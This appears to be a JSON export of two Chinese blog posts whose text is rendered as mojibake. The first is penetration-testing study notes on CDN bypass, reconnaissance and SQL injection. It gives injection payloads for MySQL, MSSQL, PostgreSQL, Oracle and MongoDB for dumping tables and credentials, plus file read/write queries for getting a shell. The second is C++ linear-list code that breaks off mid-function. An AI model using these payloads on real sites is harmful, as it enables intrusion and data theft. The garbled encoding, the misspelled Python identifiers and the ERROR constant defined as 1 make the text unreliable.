[{"title":"å°è¿ª","url":"/2022/03/08/å°è¿ª/","content":"\n# ä¿¡æ¯æ”¶é›†\n\n## Day 7 CDNç»•è¿‡\n\nåˆ¤æ–­æŸç½‘ç«™æ˜¯å¦ä½¿ç”¨CDNæœåŠ¡ï¼šä½¿ç”¨å¤šèŠ‚ç‚¹è®¿é—®ï¼ŒæŸ¥çœ‹è¿”å›IPæ˜¯å¦ç›¸åŒ\n\n#### CDNç»•è¿‡ï¼š\n\n1ã€å­åŸŸåæŸ¥è¯¢ï¼šxxx.åŸå§‹åŸŸå\n\nå­åŸŸåæŸ¥è¯¢ï¼šhttps://tool.chinaz.com/subdomain/\n\n2ã€é‚®ä»¶æœåŠ¡æŸ¥è¯¢ï¼šä½¿ç”¨é‚®ä»¶æœåŠ¡æ—¶å¤§éƒ¨åˆ†ä¸ä¼šä½¿ç”¨CDNï¼Œå°è¯•æ”¶å–æ¥è‡ªè¯¥åŸŸåçš„é‚®ä»¶å¹¶æŸ¥çœ‹åŸå§‹é‚®ä»¶æ ‡å¤´\n\n3ã€å›½å¤–åœ°å€è¯·æ±‚ï¼šé’ˆå¯¹å›½å†…ç½‘ç«™ï¼Œå¤§éƒ¨åˆ†ä¸ä¼šå¼€è®¾å›½å¤–CDN\n\n4ã€é—ç•™æ–‡ä»¶ï¼Œæ‰«æå…¨ç½‘ï¼šä¾‹å¦‚phpinfoï¼Œæ¢é’ˆç­‰ï¼Œæ‰«æå…¨ç½‘ä½¿ç”¨\n\n5ã€é»‘æš—æœç´¢å¼•æ“æœç´¢ç‰¹å®šæ–‡ä»¶ï¼šShodanï¼Œzoomeyeï¼Œfofa\n\næœå“ˆå¸Œï¼šä»¥ç½‘é¡µfavicon.icoä¸ºä¾‹\n\n```python\nimport mmh3\nimport requests\n\nre=requesets.get('åœ°å€')\nfav=re.content.encode('base64')\nhas=mh3.hash(fav)\nprint 'http.favicon.hash:'+str(hash)\n```\n\nè·å¾—ç»“æœååˆ°é»‘æš—å¼•æ“ä¸­æœç´¢ç‰¹å®šå†…å®¹\n\n6ã€DNSå†å²è®°å½•\n\n7ã€~~DDOSæ‰“çˆ†~~\n\n8ã€ç¬¬ä¸‰æ–¹æ¥å£ï¼šget-site-ip.comï¼Œthreatbook.cn\n\n<!--more-->\n\n## DAY 8 æ¶æ„ æ­å»º WAF\n\næµç¨‹ï¼šé¦–å…ˆæŸ¥çœ‹æ˜¯å¦èƒ½è·å¾—æºç ï¼Œå¦‚æœæ˜¯å¼€æºé¡¹ç›®å¯ç›´æ¥å»çš„æºç \n\nè€ŒåæŸ¥çœ‹æœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿï¼Œæ­å»ºå¹³å°ï¼Œæ•°æ®åº“ç±»å‹\n\nè¿›è€ŒæŸ¥çœ‹å„ç§ç«™ç‚¹\n\næœ€åç»•è¿‡WAF\n\næ”»å‡»ç›®æ ‡æ˜¯å¦æœ‰APPï¼šæœ‰çš„è¯é¦–å…ˆæŸ¥çœ‹æ˜¯å¦é€šè¿‡webåè®®é€šä¿¡ï¼Œæ˜¯çš„è¯æŠ“å–æ•°æ®åŒ…ï¼Œæ²¡æœ‰\n\n{% pullquote mindmap mindmap-md %}\n- ä¿¡æ¯æœé›†\n    - æœ‰æ— webç«¯\n        - æœ‰CDN\n            - æ‰¾å‡ºçœŸå®æœåŠ¡å™¨IPåæ”»å‡»\n        - æ— CDN\n            - ç¨‹åºæºç \n                - æœªçŸ¥CMS\n                - å¼€æºCMS\n        - æœåŠ¡å™¨ä¿¡æ¯\n            - æ“ä½œç³»ç»Ÿ\n            - æ­å»ºå¹³å°\n            - æ•°æ®åº“ç±»å‹\n        - ç«™ç‚¹æ­å»º\n            - ç›®å½•ç«™ç‚¹ï¼ˆä»ä¸‹å¾€ä¸Šæ‰“ï¼Œåªè¦æ‰“é€šæ•´ä¸ªæ ¹ç›®å½•ä¸‹æ‰€æœ‰ç«™ç‚¹å…¨éƒ¨è¢«æ”»å‡»ï¼‰\n            - ç«¯å£ç«™ç‚¹\n            - å­åŸŸåç«™ç‚¹\n            - æ—æ³¨ç«™ç‚¹â€”â€”åŒæœåŠ¡å™¨ä¸åŒç«™ç‚¹\n            - Cç«¯ç«™ç‚¹â€”â€”åŒç½‘æ®µä¸‹ä¸åŒæœåŠ¡å™¨ä¸åŒç«™ç‚¹\n            - ç±»ä¼¼åŸŸåç«™ç‚¹ç­‰\n        - é˜²æŠ¤åº”ç”¨WAFâ€”â€”é€šè¿‡è„šæœ¬å—…æ¢ç‰¹å¾\n            - å¤§éƒ¨åˆ†å“åº”å¤´æœ‰X-Powered-By: WAF\n            - å®‰å…¨ç‹—\n            - å®å¡”\n            - äº‘ç›¾\n            - å®‰éª‘å£«\n    - æœ‰æ— APP\n        - èµ°webåè®®\n            - æŠ“å–æ•°æ®åŒ…èµ°webæ”»å‡»\n        - éwebåè®®\n            - å°è¯•æå–\n            - åç¼–è¯‘é€†å‘\n    - æœ‰æ— å…¶ä»–\n        - èµ„äº§ä¿¡æ¯\n            - ä»¥ä¸Šå„ç§å¹³å°ä¿¡æ¯\n            - whoiså¤‡æ¡ˆ\n            - githubç­‰ç›‘æ§\n        - ç¬¬ä¸‰æ–¹åº”ç”¨\n            - æ•°æ®åº“åº”ç”¨\n                - mysql\n                - mssql\n                - oracle\n            - ç®¡ç†å¹³å°\n                - weblogic\n                - phpmyadmin\n            - ç¬¬ä¸‰æ–¹åº”ç”¨\n                - vsftpd\n                - nexus\n                - git\n        - å„ç§æœåŠ¡æ¥å£\n            - å­˜å‚¨æœåŠ¡\n            - æ”¯ä»˜æœåŠ¡\n            - å†…éƒ¨æœåŠ¡\n        - å¾®ä¿¡å…¬ä¼—å·ç­‰ä½ç½®æ‰¾åˆ°æ›´å¤šçš„åº”ç”¨\n            - æ¶‰åŠweb\n            - æ¶‰åŠAPP\n            - æ¶‰åŠå…¶ä»–\n        - å†…éƒ¨ç¾¤æˆ–å†…éƒ¨åº”ç”¨ç­‰ï¼ˆç¤¾å·¥ï¼‰\n            - QQæˆ–å¾®ä¿¡ç¾¤\n            - å·¥ä½œç¾¤\n            - å…¶ä»–ç¾¤èŠ\n\n{% endpullquote %}\n\n## DAY 10 å…¶ä»–èµ„äº§ç›‘æ§\n\nGitHubç›‘æ§ï¼šä¾¿äºæ”¶é›†æ•´ç†æœ€æ–°expæˆ–pocï¼Œå‘ç°ç›¸å…³æµ‹è¯•ç›®æ ‡çš„èµ„äº§\n\nåŸŸåæœé›†ï¼šæšä¸¾çˆ†ç ´ï¼Œåˆ©ç”¨æ¼æ´ï¼Œä¸»ç«™çˆ¬å–ï¼ŒwhoisæŸ¥è¯¢\n\n\n\n# WEBæ¼æ´\n\n## DAY 11 webæ¼æ´ åŸºç¡€\n\nWEBæ¼æ´ç±»å‹\n\n{% pullquote mindmap mindmap-md %}\n\n- WEBæ¼æ´\n  - å¸¸è§\n    - SQLæ³¨å…¥\n      - å±å®³ï¼šè·å–åˆ°éšç§˜æ•°æ®ï¼Œè·å–ç®¡ç†å‘˜è´¦å·å¯†ç ç­‰\n    - æ–‡ä»¶ä¸Šä¼ \n    - XSSè·¨ç«™\n    - æ–‡ä»¶åŒ…å«\n    - ååºåˆ—åŒ–\n    - ä»£ç æ‰§è¡Œ\n    - é€»è¾‘å®‰å…¨\n    - æœªæˆæƒè®¿é—®\n  - ä¸å¸¸è§\n    - CSRF\n    - SSRF\n    - ç›®å½•éå†\n      - äº§ç”ŸåŸå› ï¼šä¸ºæ–¹ä¾¿å°†éœ€è¦è®¿é—®çš„æ–‡ä»¶å®šä¹‰æˆå˜é‡ï¼Œæœªå¯¹ä¼ å…¥çš„æ–‡ä»¶ç›®å½•è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´æŸäº›æ–‡ä»¶è¢«è¯»å–\n      - å±å®³ï¼šæœåŠ¡å™¨ä¸­çš„éšç§æ–‡ä»¶è¢«è¯»å–\n      - æ”»å‡»æ–¹å¼ï¼šæ‰«ï¼Œå¾€æ­»é‡Œæ‰«\n    - æ–‡ä»¶è¯»å–\n    - æ–‡ä»¶ä¸‹è½½\n    - å‘½ä»¤æ‰§è¡Œ\n    - XXEå®‰å…¨\n    - å…¶ä»–\n\n{% endpullquote %}\n\n\n\n## DAY 12ï¼Œ13 webæ¼æ´ SQLæ³¨å…¥ ç®€è¦æ³¨å…¥ MySQLæ³¨å…¥\n\n**æ•°æ®åº“æ³¨å…¥åŸºæœ¬æµç¨‹**\n\né¦–å…ˆæ˜ç¡®æ•°æ®åº“çš„ç±»å‹å’Œæƒé™\n\nç„¶åæ˜ç¡®æäº¤çš„æ–¹æ³•å’Œå‚æ•°ç±»å‹ç­‰\n\næ³¨å…¥æˆåŠŸåé¦–å…ˆæ˜ç¡®æ•°æ®åº“è®°å½•ä¿¡æ¯çš„ç³»ç»Ÿè¡¨\n\nç„¶åä¾æ¬¡å¯¹è¿›è¡Œåº“è¡¨åˆ—æ•°æ®è¿›è¡Œæ³¨å…¥æŸ¥è¯¢\n\næœ€ç»ˆç›®çš„æ‰¾åˆ°ç½‘ç«™åå°å¹¶ç™»é™†å°è¯•è·å–shell\n\nå¦‚æœæƒé™è¾ƒé«˜å¯é€šè¿‡æ–‡ä»¶è¯»å†™ï¼Œå‘½ä»¤æ‰§è¡Œå’Œæ³¨å†Œè¡¨è¯»å–æ¥getshell\n\n{% pullquote mindmap mindmap-md %}\n\n- SQLæ³¨å…¥\n  - æ•°æ®åº“ç±»å‹\n    - Access\n    - Mysql\n    - Mssql\n    - Oracle\n    - Postsql\n    - SQLite\n    - Mongodb\n    - å…¶ä»–\n  - å›æ˜¾/ç›²æ³¨\n    - å›æ˜¾æ³¨å…¥\n    - æ— å›æ˜¾æ³¨å…¥\n    - å»¶æ—¶ç›²æ³¨\n    - å¸ƒå°”ç›²æ³¨\n  - æäº¤æ–¹æ³•\n    - GET\n    - POST\n    - COOKIE\n    - REQUEST\n    - HTTPå¤´\n  - æ•°æ®ç±»å‹\n    - æ•°å­—å‹\n    - å­—ç¬¦å‹\n    - æœç´¢å‹\n  - æŸ¥è¯¢æ–¹å¼\n    - select\n    - insert\n    - delete\n    - update\n    - order by\n  - æ³¨å…¥æ‹“å±•\n    - åŠ è§£å¯†æ³¨å…¥\n    - JSONæ³¨å…¥\n    - LADPæ³¨å…¥\n    - DNSlogæ³¨å…¥\n    - äºŒæ¬¡æ³¨å…¥\n    - å †å æŸ¥è¯¢\n  - WAFç»•è¿‡\n    - æ›´æ”¹æäº¤æ–¹æ³•\n    - å¤§å°å†™æ··åˆ\n    - è§£å¯†ç¼–ç ç±»\n    - æ³¨é‡Šç¬¦æ··ç”¨\n    - ç­‰ä»·å‡½æ•°æ›¿æ¢\n    - ç‰¹æ®Šç¬¦å·æ··ç”¨\n    - å€ŸåŠ©æ•°æ®åº“ç‰¹æ€§\n    - HTTPå‚æ•°æ±¡æŸ“\n    - åƒåœ¾æ•°æ®æº¢å‡º\n  - é˜²å¾¡æ–¹æ¡ˆ\n    - ä»£ç åŠ è½½è¿‡æ»¤\n    - WAFäº§å“éƒ¨ç½²\n\n{% endpullquote %}\n\n\n\n{% pullquote mindmap mindmap-md %}\n\n- SQLæ³¨å…¥æµç¨‹\n  - ä¿¡æ¯æ”¶é›†\n    - æ“ä½œç³»ç»Ÿ\n    - æ•°æ®åº“å\n    - æ•°æ®åº“ç”¨æˆ·\n    - æ•°æ®åº“ç‰ˆæœ¬\n    - å…¶ä»–(ç½‘ç«™è·¯å¾„ç­‰)\n  - æ•°æ®æ³¨å…¥:åŒæ•°æ®åº“\n    - ä½ç‰ˆæœ¬ï¼šä½¿ç”¨æš´åŠ›æŸ¥è¯¢æˆ–è€…ç»“åˆè¯»å–æŸ¥è¯¢(MySQL 5.0ä»¥ä¸‹)\n    - é«˜ç‰ˆæœ¬ï¼šä½¿ç”¨information_schemaæœ‰æ®æŸ¥è¯¢(MySQL 5.0ä»¥ä¸Š)\n  - é«˜æƒé™æ³¨å…¥\n    - å¸¸è§„æŸ¥è¯¢\n    - è·¨åº“æŸ¥è¯¢\n    - æ–‡ä»¶è¯»å†™\n\n{% endpullquote %}\n\nMYSQLæ•°æ®åº“\n\n- ç½‘ç«™A---->æ•°æ®åº“A\n  - è¡¨A\n    - åˆ—A\n      - åˆ—Aæ•°æ®\n    - åˆ—B\n      - åˆ—Bæ•°æ®\n  - è¡¨B......\n- ç½‘ç«™B---->æ•°æ®åº“B......\n\n###### MySQLæ•°æ®åº“æ³¨å…¥\n\nMySQL 5.0ä»¥ä¸Šè‡ªå¸¦ä¸€ä¸ªinformation_schemaè¡¨è®°å½•äº†æ‰€æœ‰æ•°æ®åº“å,è¡¨å,åˆ—åçš„æ•°æ®åº“,ç›¸å½“äºå¯ä»¥é€šè¿‡å®ƒè·å–æŒ‡å®šæ•°æ®åº“ä¸‹é¢çš„è¡¨åå’Œåˆ—åä¿¡æ¯\n\ntips:æ•°æ®åº“ä¸­çš„â€œ.â€ç¬¦å·è¡¨ç¤ºä¸‹ä¸€çº§,å¦‚user.memberå°±æ˜¯useråº“ä¸‹çš„menberè¡¨\n\ninformation_schema.tables\tè®°å½•æ‰€æœ‰è¡¨åä¿¡æ¯\n\ninformation_schema.columns\tè®°å½•æ‰€æœ‰åˆ—åä¿¡æ¯\n\ntable_name\tè¡¨å\n\ncolumn_name\tåˆ—å\n\n1. **æµ‹è¯•æ˜¯å¦å­˜åœ¨SQLæ³¨å…¥**\n\n```\nSELECT * FORM users WHERE id=1 and 1=1 LIMIT 0,1 \nå›æ˜¾æ­£å¸¸\nSELECT * FORM users WHERE id=1 and 1=2 LIMIT 0,1\nå›æ˜¾é”™è¯¯\n```\n\n2. **çŒœæµ‹å­—æ®µæ•°**\n\n```\norder by\t\t\t\t\t\tæµ‹è¯•å­—æ®µæ•°é‡\nunion select 1,2,3\tåˆ¤æ–­å›æ˜¾ä½ç½®\n```\n\n3. **ä¿¡æ¯æ”¶é›†**\n\n```\næ•°æ®åº“ç‰ˆæœ¬:version()\næ•°æ®åº“å:database()\næ•°æ®åº“ç”¨æˆ·:user()\næ“ä½œç³»ç»Ÿ:@@version_compile_os\n```\n\n4. **æŸ¥è¯¢æŒ‡å®šæ•°æ®åº“ä¸‹è¡¨å,åˆ—å,ä»»æ„æ•°æ®**\n\næŸ¥è¡¨å\n\n```\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\n```\n\næŸ¥åˆ—å\n\n```\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_name=\"åˆšåˆšæŸ¥å‡ºçš„è¡¨å\" and table_schema=\"æ•°æ®åº“å\"\n```\n\næŸ¥æ•°æ®\n\n```\nunion select 1,2,group_concat(æƒ³æŸ¥è¯¢çš„åˆ—) from æ•°æ®åº“å.è¡¨å\n```\n\n\n\n\n\n\n\n\n\n\n\n**æ–‡ä»¶è¯»å†™æ“ä½œ**\n\nç›®çš„ï¼šgetshell\n\n```\nselect load_file('æ–‡ä»¶ä½ç½®')\tè¯»å–æ–‡ä»¶\nselect 'X' into outfile æ–‡ä»¶ä½ç½®\n```\n\nmysql æ–°ç‰ˆæœ¬ä¸‹**secure-file-privå­—æ®µ ï¼š secure-file-privå‚æ•°æ˜¯ç”¨æ¥é™åˆ¶LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()ä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•çš„ã€‚**åœ¨è¿™ä¸ªå‚æ•°ä¹‹å¤–çš„ä½ç½®è¯»å–æ–‡ä»¶ä¼šè¿”å›NULL\n\nä¸€ä¸ªload_fileå°æç¤ºï¼šhttps://blog.csdn.net/weixin_30292843/article/details/99381669\n\n**æ–‡ä»¶è·¯å¾„çš„å¸¸è§è·å–æ–¹æ³•**ï¼š\n\næŠ¥é”™æ˜¾ç¤ºï¼šé€šè¿‡è¾“å…¥é”™è¯¯å†…å®¹å¯¼è‡´å‡½æ•°æ‰§è¡Œå‡ºé”™ï¼ŒæŠ¥é”™æ˜¾ç¤ºå‡ºæ–‡ä»¶è·¯å¾„\n\né—ç•™æ–‡ä»¶ï¼šphpinfoç­‰\n\næ¼æ´æŠ¥é”™ï¼šå„ç§æ¡†æ¶çš„é—®é¢˜\n\nå¹³å°é…ç½®æ–‡ä»¶ï¼šå¦‚apacheï¼Œnginxï¼ŒIISç­‰ä¸­é—´ä»¶\n\nçˆ†ç ´ç­‰\n\n###### é˜²æ³¨å…¥ï¼š\n\n**è‡ªå¸¦é˜²å¾¡ï¼šPHPä¸­çš„é­”æœ¯å¼•å·å¼€å…³å’Œaddslashes()å‡½æ•°**\n\n`magic_quotes_gpc`å¼€å…³è¢«æ‰“å¼€æ—¶`ï¼ˆmagic_quotes_gpc=ONï¼‰`æˆ–è¾“å…¥å†…å®¹è¢«`addslashes`å‡½æ•°å¤„ç†åæ—¶è¾“å…¥æ•°æ®ä¸­å«æœ‰å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œåæ–œæ ä¸NULLå­—ç¬¦ï¼Œéƒ½ä¼šè¢«è‡ªåŠ¨åŠ ä¸Šåæ–œæ ï¼Œé˜»æ­¢SQLæ³¨å…¥\n\nè§£å†³æ–¹æ¡ˆï¼šè¿›è¡Œ16è¿›åˆ¶ç¼–ç ï¼ŒMySQLèƒ½è‡ªåŠ¨å°†åå…­è¿›åˆ¶è½¬åŒ–ä¸ºå­—ç¬¦ä¸²æ‰§è¡Œ\n\n**å†…ç½®å‡½æ•°è®¤è¯**\n\næ²¡æ•‘äº†\n\n**å…³é”®å­—éªŒè¯**\n\nå¯å°è¯•å¤§å°å†™ç»•è¿‡\n\n**WAFé˜²æŠ¤**\n\næ‰¾æ–¹æ³•ï¼ˆè§ä¸Šæ–¹å¯¼å›¾ï¼‰å°è¯•å§\n\n**SQLMAP** yyds\n\n\n\n## DAY 14 webæ¼æ´ SQLæ³¨å…¥ æ³¨å…¥ç±»å‹ æäº¤æ³¨å…¥\n\n**æäº¤å‚æ•°ç±»å‹ï¼š**\n\næ•°å­—ï¼Œå­—ç¬¦ï¼Œæœç´¢ï¼ŒJSONç­‰\n\n**è¯·æ±‚æ–¹æ³•ï¼š**\n\nGETï¼ŒPOSTï¼ŒCOOKIEï¼ŒREQUESTï¼ŒHTTP HEADERç­‰\n\n**PHPå†…ç½®å˜é‡**\n\n$_GETï¼ˆGETä¼ å‚å†…å®¹ï¼‰\n\n$_POSTï¼ˆPOSTä¼ å‚å†…å®¹ï¼‰\n\n$_REUQESTï¼ˆGETå’ŒPOSTä¼ å‚å†…å®¹ï¼‰\n\n$_SERVERï¼ˆä¸æœåŠ¡å™¨æœ‰å…³å†…å®¹ï¼‰\n\n\n\n**SQLè¯­å¥å¹²æ‰°ç¬¦å·ï¼Œçœ‹æƒ…å†µè¿›è¡Œé—­åˆæˆ–æ³¨é‡Š**\n\n'ï¼Œ\"ï¼Œ%ï¼Œ)ï¼Œ}ç­‰\n\n\n\n**æ•°å­—å‹ï¼š**æ— å¼•å·åŒ…è£¹\n\n**å­—ç¬¦å‹ï¼š**æœ‰å¼•å·åŒ…è£¹ï¼Œéœ€è¦é—­åˆ\n\n\n\n## DAY15 webæ¼æ´ SQLæ³¨å…¥ Oracleï¼ŒMongoDBç­‰æ³¨å…¥\n\nå½“æ³¨å…¥åˆ°ä¸€ä¸ªä¸ç†Ÿæ‚‰çš„æ•°æ®åº“æ—¶ï¼Œå¯æœç´¢å¯¹åº”æ•°æ®åº“çš„å‡½æ•°æ¥å¸®åŠ©æˆ‘ä»¬\n\næ•°æ®åº“çš„ç”¨æˆ·æƒé™æ˜¯ç”±è¿æ¥SQLçš„é…ç½®æ–‡ä»¶å†³å®šçš„\n\n\n\n**ä¸åŒæ•°æ®åº“çš„ç»“æ„**\n\n- **Access**ï¼ˆ.mdbæ–‡ä»¶ï¼‰\n  - è¡¨å\n    - åˆ—å\n      - æ•°æ®\n\nç‰¹ç‚¹ï¼šä¸åŒæ•°æ®åº“æ˜¯åˆ†ç¦»çš„ï¼Œæ²¡å•¥åŠŸèƒ½\n\n\n\n- **MySQLï¼ŒMSSQLç­‰**\n  - æ•°æ®åº“å\n    - è¡¨å\n      - åˆ—å\n        - æ•°æ®\n\n\n\n\n\n\n- MSSQL\n\nç‰¹ç‚¹ï¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€è¯»å–æ³¨å†Œè¡¨ã€è¯»æ–‡ä»¶ã€å†™æ–‡ä»¶ã€ä¸‹è½½è¿œç¨‹æ–‡ä»¶ã€å¯¼å‡ºæ•°æ®åˆ°æŒ‡å®šçš„æ•°æ®åº“æœåŠ¡å™¨ï¼ˆèƒ½å¹²çš„äº‹è´¼å¤šï¼‰\n\n\n\n**ä¸åŒæ•°æ®åº“æ³¨å…¥å‘½ä»¤**\n\n- Access\n\n```\nçŒœæµ‹å­—æ®µ\norder by 3\nè·å–è¡¨åï¼ˆå­—å…¸çŒœï¼‰\nunion select 1,2,3 from xxxx\nå¦‚æœxxxxè¡¨å­˜åœ¨å°±ä¼šè¿”å›æ•°æ®ï¼Œæ²¡æœ‰åˆ™ç©º\nè·å–åˆ—åï¼ˆå­—å…¸çŒœï¼‰\nunion select 1,xxx,3 from xxxx\nå¦‚æœxxxåˆ—å­˜åœ¨å°±ä¼šè¿”å›æ•°æ®ï¼Œæ²¡æœ‰åˆ™ç©º\n```\n\n- MSSQL\n\n```\nåˆ¤æ–­æ•°æ®åº“ç±»å‹\nand exists (select count(*) from sysobjects) è¿”å›æ­£å¸¸ä¸ºMSSQL\nåˆ¤æ–­æ•°æ®åº“ç‰ˆæœ¬\næœ‰å›æ˜¾ï¼šand 1=@@version--\næ— å›æ˜¾ï¼šand substring((select @@version),22,4)='2008'--æ— å›æ˜¾ï¼Œ2008å³ä¸ºç‰ˆæœ¬ï¼ŒæŠ¥é”™è¯´æ˜ä¸æ˜¯\næ³¨å…¥ç‚¹æƒé™åˆ¤æ–­\nselect is_srvrolemember('sysadmin');  åˆ¤æ–­å½“å‰æ˜¯å¦ä¸ºsa\nselect is_srvrolemember('db_owner');  åˆ¤æ–­å½“å‰ç”¨æˆ·å†™æ–‡ä»¶ã€è¯»æ–‡ä»¶çš„æƒé™ï¼ˆdb_ownerï¼‰\nselect is_srvrolemember('public');  åˆ¤æ–­æ˜¯å¦æœ‰publicæƒé™ï¼Œå¯ä»¥çˆ†ç ´è¡¨\n```\n\n- PostgreSQL\n\n```\nçŒœæµ‹å­—æ®µ\norder by 3\nè·å–å½“å‰æ•°æ®åº“\nunion select null,null,current_database()--\nç”¨æˆ·åï¼šuser\nç”¨æˆ·æƒé™ï¼šcurrent_schema()\nä¼šè¯ç”¨æˆ·ï¼šsession_user\nè·å–è¡¨å\nunion select null,string_agg(relname,','),null,null from pg_stat_user_tables\nè·å–åˆ—å\nunion select null,string_agg(column_name,','),null,null from information_schema.columns\nè·å–æ•°æ®\nunion select null,string_agg(xxxxx,','),null,null from è¡¨å\n```\n\n- Oracle\n\n```\nçŒœæµ‹å­—æ®µ\norder by 3\nåˆ¤æ–­å­—æ®µç±»å‹\nunion select null,null,'null' from dual å¦‚æœå›æ˜¾æ­£å¸¸åˆ™è¯´æ˜3ä½ç½®æ˜¯æ•°å­—å‹ï¼Œåä¹‹åˆ™ä¸ºå­—ç¬¦å‹\nç¡®å®šå›æ˜¾ä½ç½®\nunion select 1,2,'3' from dual å‡è®¾1,2ä¸ºæ•°å­—ï¼Œ3ä¸ºå­—ç¬¦\nè·å–è¡¨å\nunion select 1,(select table_name from user_tables where rownum=1) from dual\nunion select 1,(select table_name from user_tables where rownum=1 and table_name not in ('ç¬¬ä¸€ä¸ªè¡¨')) from dual ä»¥æ­¤ç±»æ¨çˆ†å‡ºæ‰€æœ‰è¡¨å\n\nè·å–åˆ—å\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='è¡¨åï¼ˆå¤§å†™ï¼‰') from dual\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='è¡¨åï¼ˆå¤§å†™ï¼‰' and culumn_name not in ('ç¬¬ä¸€ä¸ªå­—æ®µ')) from dual ä»¥æ­¤ç±»æ¨çˆ†å‡ºæ‰€æœ‰è¡¨å\nè·å–æ•°æ®\nunion select 1,å­—æ®µ1||å­—æ®µ2||å­—æ®µ3...||å­—æ®µn from è¡¨å where rownum=1 -- åœ¨Oracleä¸­group_concatåªèƒ½è”ä¿©\n\n```\n\n- MangoDBï¼šç”¨NoSQLAttackæ‰“ \n\n```\n$neå…³é”®å­—ï¼Œæ„å‘³ä¸ç­‰äº\nMangoDBè¿›è¡Œæ“ä½œæ—¶åº”å½“å…ˆå°†å‰é¢çš„å¯¹è±¡é—­åˆ'});return ({\nè·å–å½“å‰æ•°æ®åº“\ntitle:tojson(db),xxx:'1\ndb.getCollectionNames()å‡½æ•°è·å–åˆ°çš„æ˜¯æ•°ç»„ï¼Œéœ€è¦ç”¨tojsonå‡½æ•°è½¬åŒ–ä¸ºå­—ç¬¦ä¸² \nè·å–æ‰€æœ‰é›†åˆï¼ˆè¡¨ï¼‰\ntitle:tojson(db.getCollectionNames()),xxx:'1\nè·å–æ‰€æœ‰å­—æ®µ\ndb.Authority_confidentialä¸ºå½“å‰ä½¿ç”¨çš„è¡¨\nfindå‡½æ•°ç”¨äºæŸ¥è¯¢ï¼Œ[0]ä¸ºç¬¬ä¸€æ¡æ•°æ®\ntitle:tojson(db.Authority_confidential.find()[0])\n```\n\n**SQLMAPï¼ŒNoSQLAttackï¼ŒPangolin**\n\n\n\n\n\n\n\n## DAY16 webæ¼æ´ SQLæ³¨å…¥ æŸ¥è¯¢æ–¹å¼ æŠ¥é”™ç›²æ³¨\n\n**æ•°æ®åº“çš„æŸ¥è¯¢æ–¹å¼**\n\n```\nselect æŸ¥è¯¢æ•°æ®\nåœ¨ç½‘ç«™ä¸­è¿›è¡Œæ•°æ®æ˜¾ç¤ºæŸ¥è¯¢çš„æ“ä½œ\nä¾‹ï¼šselect * from users where id=$id\n\ninsert æ’å…¥æ•°æ®\nåœ¨ç½‘ç«™ä¸­è¿›è¡Œç”¨æˆ·æ³¨å†Œæ·»åŠ ç­‰æ“ä½œ\nä¾‹ï¼šinsert into users(id,name,password) values(1,'Jlan','pass')\n\ndelete åˆ é™¤æ•°æ®\nåå°ç®¡ç†ä¸­åˆ é™¤çš„æ“ä½œ\nä¾‹ï¼šdelete from users where id=$id\n\nupdate æ›´æ–°æ•°æ®\nåå°ç®¡ç†æ•°æ®åŒæ­¥æˆ–ç¼“å­˜ç­‰æ“ä½œ\nä¾‹ï¼šupdate user set password='newpass' where id=1 and name='Jlan'\n\norder by æ’åºæ•°æ®\nä¸€èˆ¬ç»“åˆè¡¨åæˆ–åˆ—åè¿›è¡Œæ•°æ®æ’åºæ“ä½œ\nä¾‹ï¼š select * from users order by $id\n\nå¯ä»¥é€šè¿‡ä»¥ä¸ŠæŸ¥è¯¢æ–¹å¼ä¸ç½‘ç«™åº”ç”¨çš„å…³ç³»\né€šè¿‡æ³¨å…¥ç‚¹äº§ç”Ÿçš„åœ°æ–¹æˆ–åº”ç”¨çŒœåˆ°å¯¹æ–¹çš„SQLæŸ¥è¯¢æ–¹å¼\n\n```\n\n"},{"title":"æ•°æ®ç»“æ„","url":"/2022/02/14/æ•°æ®ç»“æ„/","content":"\n# æ•°æ®ç»“æ„\n\n## çº¿æ€§ç»“æ„\n\n### çº¿æ€§è¡¨é¡ºåºç»“æ„å®ç°\n\n<!--more-->\n\n```C++\n//æ•°ç»„é™æ€åˆ†é…\ntypedef struct{\n  char name[100];\n  int num;\n  float sum;\n}ElementType;\ntypedef struct{\n\tElementType data[MaxSize];\n\tint length;\n}SqList;\n\n//æ•°ç»„åŠ¨æ€åˆ†é…\ntypedef struct{\n  char name[100];\n  int num;\n  float sum;\n}ElementType;\ntypedef struct{\n\tElementType *data;\n\tint length\n}SqList;\nSqList L;\nL.data=(ElementType*)malloc(sizeof(ElementType)*MaxSize);\n//#include <cstdlib>\n//malloc(m)å‡½æ•°ï¼Œå¼€è¾Ÿmå­—èŠ‚é•¿åº¦çš„åœ°å€ç©ºé—´ï¼Œå¹¶è¿”å›è¿™æ®µç©ºé—´çš„é¦–åœ°å€\n//sizeof(x)è¿ç®—ï¼Œè®¡ç®—å˜é‡xçš„é•¿åº¦\n//free(p)å‡½æ•°ï¼Œé‡Šæ”¾æŒ‡é’ˆpæ‰€æŒ‡å˜é‡çš„å­˜å‚¨ç©ºé—´ï¼Œå½»åº•åˆ é™¤ä¸€ä¸ªå˜é‡\n//typedef type name å®šä¹‰ç§ç±»ä¸ºtypeçš„å˜é‡ç§ç±»\n\n\n//å„ç§åŠŸèƒ½å®ç°\n//å‡½æ•°ç»“æœçŠ¶æ€ä»£ç \n#define TRUE 1\n#define FALSE 0\n#define OK 1\n#define ERROR 1\n#define INFEASIBLE -1\n#define OVERFLOW -2\n//Statusæ˜¯æ‰€æœ‰å‡½æ•°çš„ç±»å‹ï¼Œå€¼æ˜¯å‡½æ•°ç»“æœçŠ¶æ€ä»£ç \ntypedef int Status;\n\n//çº¿æ€§è¡¨åˆå§‹åŒ–\nStatus InitList(SqList &L){\n  L.data=new ElementType[MAXSIZE];\n  if(!L.data)\n    exit(OVERFLOW);//å†…å­˜å¼€è¾Ÿå¤±è´¥\n  L.length=0;\n  return OK;\n}\nvoid DestoryList(SqList &L){\n  if(L.data)\n    delete L.data;\n}\nvoid ClearList(SqList &L){\n  L.length=0;\n}\nint GetLength(SqList L){\n\treturn L.length;  \n}\nbool IsEmpty(SqList L){\n  if(L.length==0)\n    return true;\n  return false;\n}\nint GetElement(SqList L,int i,ElementType &e){\n\tif(i>=1&&i<=L.length){\n    